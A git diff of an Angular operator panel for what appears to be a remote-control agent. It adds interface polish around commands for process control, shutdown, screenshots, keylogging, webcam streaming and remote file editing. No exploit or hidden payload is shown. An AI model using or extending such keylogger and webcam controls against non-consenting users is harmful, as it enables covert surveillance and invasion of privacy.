@@ -1,4 +1,5 @@
 import { Component, signal, computed } from '@angular/core';
+import { trigger, transition, style, animate } from '@angular/animations';
 import { ActivatedRoute } from '@angular/router';
 import { CommonModule, JsonPipe } from '@angular/common';
 import { FormsModule } from '@angular/forms';
@@ -7,12 +8,32 @@ import { ElementRef, ViewChild } from '@angular/core';
 import { effect } from '@angular/core';
 import { ExplorerEntry } from '../../services/websocket.service';
 import { Router } from '@angular/router';
+import { HostListener } from '@angular/core';
+
+
 @Component({
   selector: 'app-agent-detail',
   standalone: true,
   imports: [CommonModule, JsonPipe, FormsModule],
   templateUrl: './agent-detail.html',
-  styleUrls: ['./agent-detail.css']
+  styleUrls: ['./agent-detail.css'],
+  animations: [
+    trigger('moduleAnim', [
+      transition('* => *', [
+        style({
+          opacity: 0,
+          transform: 'translateY(8px)'
+        }),
+        animate(
+          '180ms ease-out',
+          style({
+            opacity: 1,
+            transform: 'translateY(0)'
+          })
+        )
+      ])
+    ])
+  ]
 })
 export class AgentDetailComponent {
   get totalAppProcesses(): number {
@@ -29,6 +50,7 @@ export class AgentDetailComponent {
        a.exe.toLowerCase().includes(f)
     );
   }
+  editorSavedFlash = false;
   selectedModule = signal<string | null>(null);
   processList = computed(() => this.ws.processList());
   appList = computed(() => this.ws.appList());
@@ -47,6 +69,9 @@ export class AgentDetailComponent {
   startAppName = "";
   startAppArgs = "";
   killAppName = "";
+  screenBusy = false;
+  webcamBusy = false;
+  
   killExeName: string = "";
   @ViewChild('webcamCanvas') webcamCanvas!: ElementRef<HTMLCanvasElement>;
   private recorder: MediaRecorder | null = null;
@@ -136,6 +161,25 @@ export class AgentDetailComponent {
     console.log("Connecting to WS:", this.agent.ip, this.agent.wsPort);
     this.ws.connect(this.agent.ip, this.agent.wsPort);
   }
+  toggleWS() {
+  if (this.ws.status() === 'connected') {
+    this.ws.disconnect();     // 🔴 DISCONNECT
+    this.onDisconnectedCleanup();
+  } else {
+    this.connectWS();         // 🟢 CONNECT (hàm cũ)
+  }
+}
+
+/* dọn UI khi ngắt kết nối (rất nên có) */
+onDisconnectedCleanup() {
+  // webcam
+  this.clearScreenshot();
+
+  // screen
+  this.clearKeylogs();
+
+}
+
   // ================================
   // MODULE UI
   // ================================
@@ -190,7 +234,9 @@ export class AgentDetailComponent {
         args: this.startExeArgs || ""
       }
     });
+    setTimeout(() => {
     this.sendProcessList();
+  }, 300);
   }
   sendProcessKill() {
     const pid = prompt("Nhập PID cần kill:");
@@ -203,6 +249,10 @@ export class AgentDetailComponent {
       command: "START",
       payload: { path: exe }
     });
+     this.startExeName = "";
+     setTimeout(() => {
+    this.sendProcessList();
+  }, 300);
   }
   killProcess(pid: number | null) {
   if (!pid) return; // null, 0, undefined đều không chạy
@@ -211,7 +261,10 @@ export class AgentDetailComponent {
     command: "KILL",
     pid: Number(pid)
   });
-   this.sendProcessList();
+  this.killExeName="";
+   setTimeout(() => {
+    this.sendProcessList();
+  }, 300);
 }
 
 
@@ -230,11 +283,41 @@ export class AgentDetailComponent {
   sendSystemLock() {
     this.ws.sendJson({ module: "SYSTEM", command: "LOCK" });
   }
+  systemConfirmOpen = false;
+systemConfirmAction: 'shutdown' | 'restart' | null = null;
+
+openSystemConfirm(action: 'shutdown' | 'restart') {
+  this.systemConfirmAction = action;
+  this.systemConfirmOpen = true;
+}
+
+closeSystemConfirm() {
+  this.systemConfirmOpen = false;
+  this.systemConfirmAction = null;
+}
+
+confirmSystemAction() {
+  if (this.systemConfirmAction === 'shutdown') {
+    this.sendSystemShutdown();
+  }
+
+  if (this.systemConfirmAction === 'restart') {
+    this.sendSystemRestart();
+  }
+
+  this.closeSystemConfirm();
+}
+
   // ================================
   // SCREENSHOT
   // ================================
   sendScreenCaptureBinary() {
+    if (this.screenBusy) return;
+  this.screenBusy = true;
     this.ws.sendJson({ module: "SCREEN", command: "CAPTURE_BINARY" });
+      setTimeout(() => {
+    this.screenBusy = false;
+  }, 400); // giả lập chờ phản hồi
   }
   clearScreenshot() {
     this.ws.screenshotUrl.set(null);
@@ -253,8 +336,10 @@ export class AgentDetailComponent {
     command: "START",
     payload: { path: this.startExeName }
   });
-
-  this.sendAppList()
+  this.startExeName="";
+  setTimeout(() => {
+    this.sendAppList();
+  }, 300);
 }
 killAppAll(exe: string) {
   if (!exe) return;
@@ -279,11 +364,28 @@ killApp(name:string|null)
 {
    if (!name) return;
    this.killApp1(name);
-   this.sendAppList();
+   setTimeout(() => {
+    this.sendAppList();
+  }, 300);
+  this.killExeName="";
 }
   // ================================
   // KEYLOGGER
   // ================================
+@HostListener('window:keydown', ['$event'])
+handleEditorShortcut(event: KeyboardEvent) {
+  if (!this.editorOpen()) return;
+
+  if ((event.ctrlKey || event.metaKey) && event.key === 's') {
+    event.preventDefault();
+    this.saveEditorFile();
+  }
+
+  if (event.key === 'Escape') {
+    event.preventDefault();
+    this.closeEditor();
+  }
+}
   sendKeyloggerStart() {
     this.ws.sendJson({ module: "KEYBOARD", command: "START" });
     this.keyloggerRunning.set(true);
@@ -312,8 +414,14 @@ killApp(name:string|null)
      this.keyloggerLocked.set(true);
   }
   sendKeyloggerUnlock() {
+     if (!!this.keyloggerRunning)
+    {
+      this.sendKeyloggerStop();
+    }
     this.ws.sendJson({ module: "KEYBOARD", command: "UNLOCK" });
+   
    this.keyloggerLocked.set(false);
+
   }
   keylogString = computed(() => {
     return this.keylogEntries().map(k => k.text).join("");
@@ -321,7 +429,11 @@ killApp(name:string|null)
   // ================================
   // WEBCAM
   // ================================
+  
   sendWebcamStartStream() {
+      if (this.webcamBusy) return;
+  this.webcamBusy = true;
+
     this.ws.sendJson({ module: "WEBCAM", command: "START_STREAM" });
     this.waitingFirstFrame = true;
     // Setup recorder
@@ -349,13 +461,21 @@ killApp(name:string|null)
       };
       reader.readAsDataURL(blob);
     };
+      setTimeout(() => {
+    this.webcamBusy = false;
+  }, 500);
   }
   sendWebcamStopStream() {
+      if (this.webcamBusy) return;
+  this.webcamBusy = true;
     this.ws.sendJson({ module: "WEBCAM", command: "STOP_STREAM" });
     if (this.isRecording && this.mediaRecorder) {
       this.mediaRecorder.stop();
     }
     this.isRecording = false;
+      setTimeout(() => {
+    this.webcamBusy = false;
+  }, 600);
   }
   private saveVideoToServer() {
     const blob = new Blob(this.recordedChunks, { type: "video/webm" });
@@ -502,6 +622,17 @@ killApp(name:string|null)
       payload: { path: item.path }
     });
   }
+  isEditableFile(item: any): boolean {
+  if (!item?.name) return false;
+
+  const name = item.name.toLowerCase();
+  return (
+    name.endsWith('.txt') ||
+    name.endsWith('.log') ||
+    name.endsWith('.ini') ||
+    name.endsWith('.json')
+  );
+}
   //  GỌI KHI SERVER TRẢ FILE
   applyEditorContent(path: string, content: string) {
     this.editorPath.set(path);
@@ -526,6 +657,8 @@ killApp(name:string|null)
     });
     // Đóng editor sau khi gửi (hoặc bạn chờ server confirm cũng được)
     this.editorOpen.set(false);
+      this.editorSavedFlash = true;
+  setTimeout(() => this.editorSavedFlash = false, 300);
   }
 // ĐÓNG EDITOR
  closeEditor() {
